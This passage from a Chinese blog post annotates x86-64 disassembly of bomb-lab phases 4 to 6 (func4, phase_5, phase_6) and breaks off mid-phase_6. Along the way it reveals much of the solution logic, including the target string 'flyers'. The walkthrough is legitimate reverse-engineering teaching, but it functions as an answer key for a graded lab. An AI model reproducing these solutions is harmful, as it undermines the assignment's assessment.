eax被置为14 0b1110</span><br>  <span class="hljs-number">400f</span>dd:d1 f8                sar    %eax <span class="hljs-comment">// eax被置为0b111，即7</span><br>  <span class="hljs-number">400f</span>df:<span class="hljs-number">8</span>d <span class="hljs-number">0</span>c <span class="hljs-number">30</span>             <span class="hljs-built_in">lea</span>    (%rax,%rsi,<span class="hljs-number">1</span>),%ecx <span class="hljs-comment">// ecx被置为7</span><br>  <br>  <span class="hljs-number">400f</span>e2:<span class="hljs-number">39</span> f9                cmp    %edi,%ecx <span class="hljs-comment">// x和7比较</span><br>  <span class="hljs-number">400f</span>e4:<span class="hljs-number">7</span>e <span class="hljs-number">0</span>c                jle    <span class="hljs-number">400f</span>f2 &lt;func4+<span class="hljs-number">0x24</span>&gt; <span class="hljs-comment">// 如果x&lt;=7，跳转</span><br>  <span class="hljs-number">400f</span>e6:<span class="hljs-number">8</span>d <span class="hljs-number">51</span> ff             lea    <span class="hljs-number">-0x1</span>(%rcx),%edx<br>  <span class="hljs-number">400f</span>e9:e8 e0 ff ff ff       callq  <span class="hljs-number">400f</span>ce &lt;func4&gt;<br>  <span class="hljs-number">400f</span>ee:<span class="hljs-number">01</span> c0                add    %eax,%eax<br>  <span class="hljs-number">400f</span>f0:eb <span class="hljs-number">15</span>                jmp    <span class="hljs-number">401007</span> &lt;func4+<span class="hljs-number">0x39</span>&gt;<br>  <br>  <span class="hljs-number">400f</span>f2:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax <span class="hljs-comment">// 将eax置为0</span><br>  <span class="hljs-number">400f</span>f7:<span class="hljs-number">39</span> f9                cmp    %edi,%ecx <span class="hljs-comment">// 将x和7比较</span><br>  <span class="hljs-number">400f</span>f9:<span class="hljs-number">7</span>d <span class="hljs-number">0</span>c                jge    <span class="hljs-number">401007</span> &lt;func4+<span class="hljs-number">0x39</span>&gt; <span class="hljs-comment">// 如果大于等于7，则直接跳出程序</span><br>  <span class="hljs-number">400f</span>fb:<span class="hljs-number">8</span>d <span class="hljs-number">71</span> <span class="hljs-number">01</span>             lea    <span class="hljs-number">0x1</span>(%rcx),%esi <span class="hljs-comment">// 将esi置为8</span><br>  <span class="hljs-number">400f</span>fe:e8 cb ff ff ff       callq  <span class="hljs-number">400f</span>ce &lt;func4&gt; <span class="hljs-comment">// 递归</span><br>  <span class="hljs-number">401003</span>:<span class="hljs-number">8</span>d <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span>          lea    <span class="hljs-number">0x1</span>(%rax,%rax,<span class="hljs-number">1</span>),%eax<br>  <span class="hljs-number">401007</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">08</span>          add    $<span class="hljs-number">0x8</span>,%rsp<br>  <span class="hljs-number">40100b</span>:c3                   retq   <br></code></pre></td></tr></table></figure>我刚开始做phase4的时候，陷入了func4这个函数里，完全搞不清楚它在干啥。这也有了一个教训，看汇编代码的时候，不要陷进去汇编的细节，要能够提取它的作用，用C语言的形式去想一下，或者想一想它具体在完成什么动作。</li></ol><h1 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h1><p>这个炸弹很有意思</p><ol><li>首先阅读汇编代码，搞清楚每个语句的作用，然后按照代码的逻辑给它划分，看的更加有层次感，最后搞清楚每个层次都干了什么</li><li>首先，这个phase需要我们输入一个长度为6的字符串</li><li>然后根据我们这些字符串的ascii码的二进制表示的最低4位的值为偏移，去系统给出的一个字符串取字符</li><li>根据输入的6个字符取出来的6个字符需要刚好和系统给定的另一个字符串相同<br>做的时候踩了些坑</li><li>第一遍阅读汇编代码的时候，就可以尝试去划分和理解，不用等到完全读了一遍之后再来划分。这样效率其实很低。耐下心来正确地分析代码，还是可以在第一遍读代码的时候就理解代码的逻辑的。这样就算没有很清楚，也可以通过第二轮去专门划分</li><li>有的时候各种寄存器一波操作，其实就是完成了一个很简单的逻辑，不要迷失在细节里了</li><li>分清楚传的是寄存器的值还是这个寄存器指向的内存的值<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000401062</span> &lt;phase_5&gt;:<br><span class="hljs-comment">// 将fs:0x28的值放到rsp+24字节的位置</span><br>  <span class="hljs-number">401062</span>:<span class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-number">401063</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">20</span>          sub    $<span class="hljs-number">0x20</span>,%rsp <span class="hljs-comment">// 给栈挪出32字节的位置</span><br>  <span class="hljs-number">401067</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> fb             mov    %rdi,%rbx <span class="hljs-comment">// 将我们的输入给rbx</span><br>  <span class="hljs-number">40106</span>a:<span class="hljs-number">64</span> <span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> mov    %fs:<span class="hljs-number">0x28</span>,%rax <span class="hljs-comment">// 将段寄存器偏移40字节的值给rax</span><br>  <span class="hljs-number">401071</span>:<span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>  <span class="hljs-number">401073</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       mov    %rax,<span class="hljs-number">0x18</span>(%rsp) <span class="hljs-comment">// 将rax给栈顶指针+24字节的位置</span><br><br><span class="hljs-comment">// 判断输入字符串的长度是否是6，如果不是6则直接爆炸</span><br>  <span class="hljs-number">401078</span>:<span class="hljs-number">31</span> c0                <span class="hljs-keyword">xor</span>    %eax,%eax <span class="hljs-comment">// eax清零</span><br>  <span class="hljs-number">40107</span>a:e8 <span class="hljs-number">9</span>c <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40131b</span> &lt;string_length&gt; <span class="hljs-comment">// 获取我们输入的字符串的长度</span><br>  <span class="hljs-number">40107f</span>:<span class="hljs-number">83</span> f8 <span class="hljs-number">06</span>             cmp    $<span class="hljs-number">0x6</span>,%eax <span class="hljs-comment">// 判断是否是6</span><br>  <span class="hljs-number">401082</span>:<span class="hljs-number">74</span> <span class="hljs-number">4</span>e                je     <span class="hljs-number">4010</span>d2 &lt;phase_5+<span class="hljs-number">0x70</span>&gt; <span class="hljs-comment">// 如果是6的话，则跳过炸弹</span><br>  <span class="hljs-number">401084</span>:e8 b1 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt; <span class="hljs-comment">// 如果不是6，则直接爆炸</span><br>  <span class="hljs-number">401089</span>:eb <span class="hljs-number">47</span>                jmp    <span class="hljs-number">4010</span>d2 &lt;phase_5+<span class="hljs-number">0x70</span>&gt;<br><br><span class="hljs-comment">// 这一段就是把我们输入的字符串通过一些奇怪的处理，放置在栈上rsp+16开始的位置，16-21</span><br><span class="hljs-comment">// 这个奇怪的处理应该是根据我们输入的字符，用它们的ascii码为偏移，去0x4024b0地址取字符放到rsp+16开始的位置</span><br>  <span class="hljs-number">40108b</span>:<span class="hljs-number">0f</span> b6 <span class="hljs-number">0</span>c <span class="hljs-number">03</span>          <span class="hljs-built_in">movzbl</span> (%rbx,%rax,<span class="hljs-number">1</span>),%ecx <span class="hljs-comment">// 将rbx+rax指向的值放入ecx，这里的rbx就是我们的输入，这里应该就是依次把字符给ecx</span><br>  <span class="hljs-number">40108f</span>:<span class="hljs-number">88</span> <span class="hljs-number">0</span>c <span class="hljs-number">24</span>             mov    %cl,(%rsp) <span class="hljs-comment">// 将ecx的值为栈顶指向的位置</span><br>  <span class="hljs-number">401092</span>:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">14</span> <span class="hljs-number">24</span>          <span class="hljs-built_in">mov</span>    (%rsp),%rdx <span class="hljs-comment">// 把栈顶的值给edx</span><br>  <span class="hljs-number">401096</span>:<span class="hljs-number">83</span> e2 <span class="hljs-number">0f</span>             <span class="hljs-keyword">and</span>    $<span class="hljs-number">0xf</span>,%edx <span class="hljs-comment">// 用0b1111与edx按位与</span><br>  <span class="hljs-number">401099</span>:<span class="hljs-number">0f</span> b6 <span class="hljs-number">92</span> b0 <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> movzbl <span class="hljs-number">0x4024b0</span>(%rdx),%edx <span class="hljs-comment">// 将0x4024b0+edx指向的值给edx</span><br>  <span class="hljs-number">4010</span>a0:<span class="hljs-number">88</span> <span class="hljs-number">54</span> <span class="hljs-number">04</span> <span class="hljs-number">10</span>          mov    %dl,<span class="hljs-number">0x10</span>(%rsp,%rax,<span class="hljs-number">1</span>) <span class="hljs-comment">// 将edx的值放到16+rsp+rax指向的位置</span><br>  <span class="hljs-number">4010</span>a4:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c0 <span class="hljs-number">01</span>          add    $<span class="hljs-number">0x1</span>,%rax <span class="hljs-comment">// 给rax+1</span><br>  <span class="hljs-number">4010</span>a8:<span class="hljs-number">48</span> <span class="hljs-number">83</span> f8 <span class="hljs-number">06</span>          cmp    $<span class="hljs-number">0x6</span>,%rax <span class="hljs-comment">// 6和rax比较</span><br>  <span class="hljs-number">4010</span>ac:<span class="hljs-number">75</span> dd                jne    <span class="hljs-number">40108b</span> &lt;phase_5+<span class="hljs-number">0x29</span>&gt; <span class="hljs-comment">// 如果不同，则继续循环</span><br><br><span class="hljs-comment">// 判断我们放在栈上的字符串是否和0x40245e这个地址的字符一样</span><br>  <span class="hljs-number">4010</span>ae:c6 <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">16</span> <span class="hljs-number">00</span>       movb   $<span class="hljs-number">0x0</span>,<span class="hljs-number">0x16</span>(%rsp) <span class="hljs-comment">// 将rsp+22指向的值置为0</span><br>  <span class="hljs-number">4010b</span>3:be <span class="hljs-number">5</span>e <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x40245e</span>,%esi <span class="hljs-comment">// 给esi一个地址0x40245e // &quot;flyers&quot;</span><br>  <span class="hljs-number">4010b</span>8:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">10</span>       lea    <span class="hljs-number">0x10</span>(%rsp),%rdi <span class="hljs-comment">// 给rdi一个地址rsp+16 // &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br>  <span class="hljs-number">4010b</span>d:e8 <span class="hljs-number">76</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">401338</span> &lt;strings_not_equal&gt; <span class="hljs-comment">// 比较这两个地址指向的字符串</span><br>  <span class="hljs-number">4010</span>c2:<span class="hljs-number">85</span> c0                test   %eax,%eax <br>  <span class="hljs-number">4010</span>c4:<span class="hljs-number">74</span> <span class="hljs-number">13</span>                je     <span class="hljs-number">4010</span>d9 &lt;phase_5+<span class="hljs-number">0x77</span>&gt; <span class="hljs-comment">// 如果字符串相同，则跳过炸弹</span><br>  <span class="hljs-number">4010</span>c6:e8 <span class="hljs-number">6f</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt; <span class="hljs-comment">// 如果字符串不相同，则爆炸</span><br>  <span class="hljs-number">4010</span>cb:<span class="hljs-number">0f</span> <span class="hljs-number">1f</span> <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       nopl   <span class="hljs-number">0x0</span>(%rax,%rax,<span class="hljs-number">1</span>)<br>  <span class="hljs-number">4010</span>d0:eb <span class="hljs-number">07</span>                jmp    <span class="hljs-number">4010</span>d9 &lt;phase_5+<span class="hljs-number">0x77</span>&gt;<br><br>  <span class="hljs-number">4010</span>d2:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax <span class="hljs-comment">// 将eax置0</span><br>  <span class="hljs-number">4010</span>d7:eb b2                jmp    <span class="hljs-number">40108b</span> &lt;phase_5+<span class="hljs-number">0x29</span>&gt; <span class="hljs-comment">// 跳转</span><br><br><span class="hljs-comment">// 比较%fs:0x2和栈上0x18(%rsp)开始的值是否一样，一样则成功。这个测试正常来说不会有问题。</span><br>  <span class="hljs-number">4010</span>d9:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       mov    <span class="hljs-number">0x18</span>(%rsp),%rax <span class="hljs-comment">// 将rsp+24指向的值给rax</span><br>  <span class="hljs-number">4010</span>de:<span class="hljs-number">64</span> <span class="hljs-number">48</span> <span class="hljs-number">33</span> <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-keyword">xor</span>    %fs:<span class="hljs-number">0x28</span>,%rax <span class="hljs-comment">// 将rax和一个地址的值异或</span><br>  <span class="hljs-number">4010e5</span>:<span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>  <span class="hljs-number">4010e7</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">4010</span>ee &lt;phase_5+<span class="hljs-number">0x8c</span>&gt; <span class="hljs-comment">// 如果等于0，则跳过下面这个函数，成功返回</span><br>  <span class="hljs-number">4010e9</span>:e8 <span class="hljs-number">42</span> fa ff ff       callq  <span class="hljs-number">400b</span>30 &lt;__stack_chk_fail@plt&gt;<br>  <span class="hljs-number">4010</span>ee:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">20</span>          add    $<span class="hljs-number">0x20</span>,%rsp<br>  <span class="hljs-number">4010f</span>2:<span class="hljs-number">5b</span>                   pop    %rbx<br>  <span class="hljs-number">4010f</span>3:c3                   retq   <br></code></pre></td></tr></table></figure></li></ol><h1 id="phase6"><a href="#phase6" class="headerlink" title="phase6"></a>phase6</h1><p>这个lab也很有意思啊</p><ol><li>首先，它需要我们输入六个数字</li><li>其次，它要求我们这个六个数字都小于等于6，并且不重复</li><li>然后，它会把我们这六个数字替换为7-x，即如果输入是123456，就会被替换成654321</li><li>然后，它会根据现在的数字，去一个链表里取6个数字。比如我们现在的数字被变成了6454321，那么它就会去这个链表里取出从第六个到第一个结点的地址。再将这个地址放到栈中从rsp+0x20开始的地方</li><li>然后，它会依次把取出来的六个结点串成一个链表</li><li>最后，它会检查这个链表是否是一个单调递减链表<br>因此，我们输入的六个数字其实就相当于是一个排序的方法，如果我们输入214356，那就代表着我们把原链表里的顺序从123456改为214356，然后判断修改之后是否是单调递减的。注意，这里说的123456指的是链表的结点编号，排序的依据是这个节点的val。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00000000004010f</span>4 &lt;phase_6&gt;:<br><span class="hljs-comment">// 准备操作</span><br>  <span class="hljs-number">4010f</span>4:<span class="hljs-number">41</span> <span class="hljs-number">56</span>                push   %r14<br>  <span class="hljs-number">4010f</span>6:<span class="hljs-number">41</span> <span class="hljs-number">55</span>                push   %r13<br>  <span class="hljs-number">4010f</span>8:<span class="hljs-number">41</span> <span class="hljs-number">54</span>                push   %r12<br>  <span class="hljs-number">4010f</span>a:<span class="hljs-number">55</span>                   push   %rbp<br>  <span class="hljs-number">4010f</span>b:<span class="hljs-number">53</span>                   push   %rbx<br><span class="hljs-comment">// 开始操作</span><br>  <span class="hljs-number">4010f</span>c:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">50</span>          sub    $<span class="hljs-number">0x50</span>,%rsp <span class="hljs-comment">// 开辟了80个字节的栈空间</span><br>  <span class="hljs-number">401100</span>:<span class="hljs-number">49</span> <span class="hljs-number">89</span> e5             mov    %rsp,%r13 <span class="hljs-comment">// 将栈顶指针给r13</span><br>  <span class="hljs-number">401103</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> e6             mov    %rsp,%rsi <span class="hljs-comment">// 将栈顶指针给了rsi，即函数的第二个参数</span><br>  <span class="hljs-number">401106</span>:e8 <span class="hljs-number">51</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40145</span>c &lt;read_six_numbers&gt; <span class="hljs-comment">// 将我们输入的6个数字读入栈中</span><br>  <span class="hljs-number">40110b</span>:<span class="hljs-number">49</span> <span class="hljs-number">89</span> e6             mov    %rsp,%r14 <span class="hljs-comment">// 把栈指针给了r14</span><br>  <span class="hljs-number">40110</span>e:<span class="hljs-number">41</span> bc <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    mov    $<span class="hljs-number">0x0</span>,%r12d <span class="hljs-comment">// 将r12置为0</span><br><br><span class="hljs-comment">// 下面这一波就是判断，是否六个数字都不同，并且六个数字都小于等于6</span><br>  <span class="hljs-number">401114</span>:<span class="hljs-number">4</span>c <span class="hljs-number">89</span> ed             mov    %r13,%rbp <span class="hljs-comment">// 把r13给rbp，rbp是栈底指针啊</span><br>  <span class="hljs-number">401117</span>:<span class="hljs-number">41</span> <span class="hljs-number">8b</span> <span class="hljs-number">45</span> <span class="hljs-number">00</span>          mov    <span class="hljs-number">0x0</span>(%r13),%eax <span class="hljs-comment">// 把r13指向的东西赋给了eax，r13现在是栈底，应该就是我们输入的第一个数字</span><br>  <span class="hljs-number">40111b</span>:<span class="hljs-number">83</span> e8 <span class="hljs-number">01</span>             sub    $<span class="hljs-number">0x1</span>,%eax <span class="hljs-comment">// 将输入的第一个数字减1</span><br>  <span class="hljs-number">40111</span>e:<span class="hljs-number">83</span> f8 <span class="hljs-number">05</span>             cmp    $<span class="hljs-number">0x5</span>,%eax <span class="hljs-comment">// 5和输入的数字进行比较</span><br>  <span class="hljs-number">401121</span>:<span class="hljs-number">76</span> <span class="hljs-number">05</span>                jbe    <span class="hljs-number">401128</span> &lt;phase_6+<span class="hljs-number">0x34</span>&gt; <span class="hljs-comment">// 输入的数字减1后小于等于5，则跳过炸弹，否则爆炸</span><br>  <span class="hljs-number">401123</span>:e8 <span class="hljs-number">12</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">401128</span>:<span class="hljs-number">41</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">01</span>          add    $<span class="hljs-number">0x1</span>,%r12d <span class="hljs-comment">// 给r12加1,r12在这之前刚被置为0</span><br>  <span class="hljs-number">40112</span>c:<span class="hljs-number">41</span> <span class="hljs-number">83</span> fc <span class="hljs-number">06</span>          cmp    $<span class="hljs-number">0x6</span>,%r12d <span class="hljs-comment">// 6和r12对比，如果一样则跳转，第一次到这里应该是不会跳转</span><br>  <span class="hljs-number">401130</span>:<span class="hljs-number">74</span> <span class="hljs-number">21</span>                je     <span class="hljs-number">401153</span> &lt;phase_6+<span class="hljs-number">0x5f</span>&gt;<br>  <span class="hljs-number">401132</span>:<span class="hljs-number">44</span> <span class="hljs-number">89</span> e3             mov    %r12d,%ebx <span class="hljs-comment">// 将r12给ebx，即ebx置为1</span><br><span class="hljs-comment">// 下面这一段是判断输入的第2到第6数是否都不和第1个数相同，如果存在相同的，则直接爆炸</span><br>  <span class="hljs-number">401135</span>:<span class="hljs-number">48</span> <span class="hljs-number">63</span> c3             movslq %ebx,%rax <span class="hljs-comment">// 将ebx给rax，rax=1</span><br>  <span class="hljs-number">401138</span>:<span class="hljs-number">8b</span> <span class="hljs-number">04</span> <span class="hljs-number">84</span>             <span class="hljs-built_in">mov</span>    (%rsp,%rax,<span class="hljs-number">4</span>),%eax <span class="hljs-comment">// eax=rsp+4*rax指向的值，第一次运行到这里应该是rsp+4，访问的是输入的第2个数字</span><br>  <span class="hljs-number">40113b</span>:<span class="hljs-number">39</span> <span class="hljs-number">45</span> <span class="hljs-number">00</span>             cmp    %eax,<span class="hljs-number">0x0</span>(%rbp) <span class="hljs-comment">// eax和rbp指向的值比较,即第一个数和第二个数进行比较</span><br>  <span class="hljs-number">40113</span>e:<span class="hljs-number">75</span> <span class="hljs-number">05</span>                jne    <span class="hljs-number">401145</span> &lt;phase_6+<span class="hljs-number">0x51</span>&gt; <span class="hljs-comment">// 如果不同，则跳转，否则就爆炸</span><br>  <span class="hljs-number">401140</span>:e8 f5 <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">401145</span>:<span class="hljs-number">83</span> c3 <span class="hljs-number">01</span>             add    $<span class="hljs-number">0x1</span>,%ebx <span class="hljs-comment">// ebx+=1</span><br>  <span class="hljs-number">401148</span>:<span class="hljs-number">83</span> fb <span class="hljs-number">05</span>             cmp    $<span class="hljs-number">0x5</span>,%ebx <span class="hljs-comment">// ebx和5进行对比，如果ebx小于等于5，则跳转</span><br>  <span class="hljs-number">40114b</span>:<span class="hljs-number">7</span>e e8                jle    <span class="hljs-number">401135</span> &lt;phase_6+<span class="hljs-number">0x41</span>&gt;<br><span class="hljs-comment">// 给r13加4</span><br>  <span class="hljs-number">40114</span>d:<span class="hljs-number">49</span> <span class="hljs-number">83</span> c5 <span class="hljs-number">04</span>          add    $<span class="hljs-number">0x4</span>,%r13<br>  <span class="hljs-number">401151</span>:eb c1                jmp    <span class="hljs-number">401114</span> &lt;phase_6+<span class="hljs-number">0x20</span>&gt;<br><br>  <span class="hljs-number">401153</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">74</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       lea    <span class="hljs-number">0x18</span>(%rsp),%rsi <span class="hljs-comment">// 将rsi指向rsp+24的位置</span><br>  <span class="hljs-number">401158</span>:<span class="hljs-number">4</span>c <span class="hljs-number">89</span> f0             mov    %r14,%rax <span class="hljs-comment">// 把r14给rax，第一次运行到这里的时候r14这时候就是rsp</span><br>  <span class="hljs-number">40115b</span>:b9 <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x7</span>,%ecx <span class="hljs-comment">// ecx置为7</span><br><span class="hljs-comment">// 这是一个小循环，循环6次，将我们输入的数，都换成7-x</span><br>  <span class="hljs-number">401160</span>:<span class="hljs-number">89</span> ca                mov    %ecx,%edx <span class="hljs-comment">// edx置为7</span><br>  <span class="hljs-number">401162</span>:<span class="hljs-number">2b</span> <span class="hljs-number">10</span>                <span class="hljs-built_in">sub</span>    (%rax),%edx <span class="hljs-comment">// 7-rsp指向的值</span><br>  <span class="hljs-number">401164</span>:<span class="hljs-number">89</span> <span class="hljs-number">10</span>                mov    %edx,(%rax) <span class="hljs-comment">// 再将7-rsp指向的值放到rsp指向的位置</span><br>  <span class="hljs-number">401166</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c0 <span class="hljs-number">04</span>          add    $<span class="hljs-number">0x4</span>,%rax <span class="hljs-comment">// rax+4</span><br>  <span class="hljs-number">40116</span>a:<span class="hljs-number">48</span> <span class="hljs-number">39</span> f0             cmp    %rsi,%rax <span class="hljs-comment">// rsi和rax比较</span><br>  <span class="hljs-number">40116</span>d:<span class="hljs-number">75</span> f1                jne    <span class="hljs-number">401160</span> &lt;phase_6+<span class="hljs-number">0x6c</span>&gt; <span class="hljs-comment">// 如果不一样，则继续循环</span><br><span class="hljs-comment">// 现在栈顶的6个数字分别是，6 5 4 3 2 1</span><br><span class="hljs-comment">// 下面的操作是根据栈顶的六个数字，去一个链表里取结点</span><br>  <span class="hljs-number">40116f</span>:be <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%esi <span class="hljs-comment">// esi置为0</span><br>  <span class="hljs-number">401174</span>:eb <span class="hljs-number">21</span>                jmp    <span class="hljs-number">401197</span> &lt;phase_6+<span class="hljs-number">0xa3</span>&gt; <span class="hljs-comment">// 跳转</span><br><br>  <span class="hljs-number">401176</span>:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">52</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rdx),%rdx <span class="hljs-comment">// rdx+8指向的值放到rdx中</span><br>  <span class="hljs-number">40117</span>a:<span class="hljs-number">83</span> c0 <span class="hljs-number">01</span>             add    $<span class="hljs-number">0x1</span>,%eax <span class="hljs-comment">// eax+1</span><br>  <span class="hljs-number">40117</span>d:<span class="hljs-number">39</span> c8                cmp    %ecx,%eax <span class="hljs-comment">// ecx中存放的是我们输入的数字，</span><br>  <span class="hljs-number">40117f</span>:<span class="hljs-number">75</span> f5                jne    <span class="hljs-number">401176</span> &lt;phase_6+<span class="hljs-number">0x82</span>&gt; <span class="hljs-comment">// 如果不同的话，就不断循环</span><br><br>  <span class="hljs-number">401181</span>:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">401188</span> &lt;phase_6+<span class="hljs-number">0x94</span>&gt;<br>  <span class="hljs-number">401183</span>:ba d0 <span class="hljs-number">32</span> <span class="hljs-number">60</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x6032d0</span>,%edx<br><br>  <span class="hljs-number">401188</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">54</span> <span class="hljs-number">74</span> <span class="hljs-number">20</span>       mov    %rdx,<span class="hljs-number">0x20</span>(%rsp,%rsi,<span class="hljs-number">2</span>) <span class="hljs-comment">// 6304544 6304528 6304512 6304496 6304480 0x6032d0</span><br>  <span class="hljs-number">40118</span>d:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c6 <span class="hljs-number">04</span>          add    $<span class="hljs-number">0x4</span>,%rsi<br>  <span 